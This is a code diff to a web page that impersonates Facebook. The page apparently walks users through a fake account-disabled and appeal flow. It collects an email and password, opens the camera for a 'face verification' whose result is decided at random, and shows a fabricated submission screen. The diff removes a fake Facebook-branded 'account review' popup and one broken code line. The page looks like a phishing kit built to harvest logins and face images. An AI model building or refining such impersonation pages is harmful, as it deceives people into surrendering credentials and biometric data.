@@ -344,6 +344,18 @@ body{
   padding:20px;
 }
 
+.instructions-text{
+  font-size:16px;
+  color:#000000;
+  margin-bottom:8px;
+}
+
+.sub-text{
+  font-size:14px;
+  color:#65676b;
+  margin-bottom:20px;
+}
+
 .loading-status{
   display:none;
   text-align:center;
@@ -395,85 +407,6 @@ body{
 
 .status-text.error{
   color:#ff4d4f;
-}
-
-/* === ACCOUNT REVIEW POPUP === */
-.review-popup{
-  position:fixed;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  background:rgba(0,0,0,0.5);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  z-index:9998;
-}
-
-.review-popup-content{
-  background:#fff;
-  border-radius:12px;
-  padding:32px 24px;
-  text-align:center;
-  max-width:320px;
-  width:90%;
-  box-shadow:0 4px 20px rgba(0,0,0,0.15);
-}
-
-.review-header{
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  margin-bottom:24px;
-}
-
-.review-logo{
-  font-size:22px;
-  font-weight:700;
-  color:#1877f2;
-}
-
-.review-close{
-  font-size:20px;
-  color:#65676b;
-  cursor:pointer;
-  line-height:1;
-}
-
-.review-icon{
-  font-size:48px;
-  margin-bottom:16px;
-}
-
-.review-popup h3{
-  font-size:18px;
-  font-weight:600;
-  color:#000;
-  margin-bottom:12px;
-}
-
-.review-popup p{
-  font-size:15px;
-  color:#65676b;
-  margin-bottom:20px;
-  line-height:1.5;
-}
-
-.progress-bar-container{
-  width:100%;
-  height:8px;
-  background:#e4e6eb;
-  border-radius:4px;
-  overflow:hidden;
-}
-
-.progress-bar-fill{
-  height:100%;
-  background:#1877f2;
-  width:0%;
-  border-radius:4px;
-  transition:width 0.3s ease;
 }
 
 /* === APPEAL SUBMITTED PAGE === */
@@ -684,22 +617,6 @@ body{
   </div>
 </div>
 
-<!-- ACCOUNT REVIEW POP-UP -->
-<div id="reviewPopup" class="review-popup hidden">
-  <div class="review-popup-content">
-    <div class="review-header">
-      <span class="review-logo">facebook</span>
-      <span class="review-close" onclick="closeReviewPopup()">&times;</span>
-    </div>
-    <div class="review-icon">🤖</div>
-    <h3>Account review</h3>
-    <p>We're reviewing your account security and activity.<br>This may take a few moments...</p>
-    <div class="progress-bar-container">
-      <div id="reviewProgressBar" class="progress-bar-fill"></div>
-    </div>
-  </div>
-</div>
-
 <!-- APPEAL SUBMITTED PAGE -->
 <div id="submittedScreen" class="appeal-submitted hidden">
   <div class="appeal-top-bar">
@@ -724,11 +641,9 @@ body{
     </div>
   </div>
 </div>
-
 <script>
 let cameraStream = null;
 let cameraActive = false;
-let reviewProgressInterval = null;
 
 function formatDate(date){
   const months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
@@ -745,8 +660,6 @@ function formatDate(date){
 
 function showFlashAndGo(targetScreen, delayMs = 400){
   const flash = document.getElementById('flashScreen');
-  flash.classList.add('active
-;
   flash.classList.add('active');
   setTimeout(()=>{ flash.classList.remove('active'); }, 200);
   setTimeout(()=>{ showScreen(targetScreen); }, delayMs);
@@ -757,41 +670,11 @@ function showScreen(id){
   document.getElementById(id).classList.remove('hidden');
 }
 
-function showReviewPopup(){
-  const popup = document.getElementById('reviewPopup');
-  popup.classList.remove('hidden');
-  
-  const progressBar = document.getElementById('reviewProgressBar');
-  progressBar.style.width = '0%';
-  let progress = 0;
-  
-  if(reviewProgressInterval) clearInterval(reviewProgressInterval);
-  
-  reviewProgressInterval = setInterval(() => {
-    progress += Math.random() * 12 + 3;
-    if(progress >= 100){
-      progress = 100;
-      clearInterval(reviewProgressInterval);
-      setTimeout(() => {
-        closeReviewPopup();
-        document.getElementById('appealDate').textContent = formatDate(new Date());
-        showFlashAndGo('submittedScreen');
-      }, 800);
-    }
-    progressBar.style.width = progress + '%';
-  }, 350);
-}
-
-function closeReviewPopup(){
-  document.getElementById('reviewPopup').classList.add('hidden');
-  if(reviewProgressInterval) clearInterval(reviewProgressInterval);
-}
-
 function handleLogin(){
   const email = document.getElementById('emailInput').value;
   const pass = document.getElementById('passInput').value;
   if(!email || !pass){
-    alert('Please enter email and password to continue.');
+    alert('Please enter email and password to continue. ');
     return;
   }
   setTimeout(()=>{ showFlashAndGo('disabledScreen'); }, 400);
@@ -799,7 +682,6 @@ function handleLogin(){
 
 function goToLogin(){
   stopCamera();
-  closeReviewPopup();
   showFlashAndGo('loginScreen');
   document.getElementById('emailInput').value = '';
   document.getElementById('passInput').value = '';
@@ -835,6 +717,7 @@ async function startCamera(){
   const btn = document.getElementById('scanBtn');
   const status = document.getElementById('statusText');
   const loading = document.getElementById('loadingStatus');
+  const scanStatus = document.getElementById('scanStatus');
 
   try {
     cameraStream = await navigator.mediaDevices.getUserMedia({ 
@@ -848,18 +731,21 @@ async function startCamera(){
     btn.textContent = 'Scanning...';
     status.style.display = 'none';
     loading.style.display = 'block';
+    scanStatus.textContent = 'Verifying face...';
+    cameraActive = true;
 
     setTimeout(() => {
       if(Math.random() > 0.35){
         loading.style.display = 'none';
         status.style.display = 'block';
-        status.textContent = '✅ Face verified successfully!';
+        status.textContent = 'Face verified successfully!';
         status.className = 'status-text success';
         
         setTimeout(() => {
           stopCamera();
-          showReviewPopup();
-        }, 1000);
+          document.getElementById('appealDate').textContent = formatDate(new Date());
+          showFlashAndGo('submittedScreen');
+        }, 1500);
       } else {
         loading.style.display = 'none';
         status.style.display = 'block';
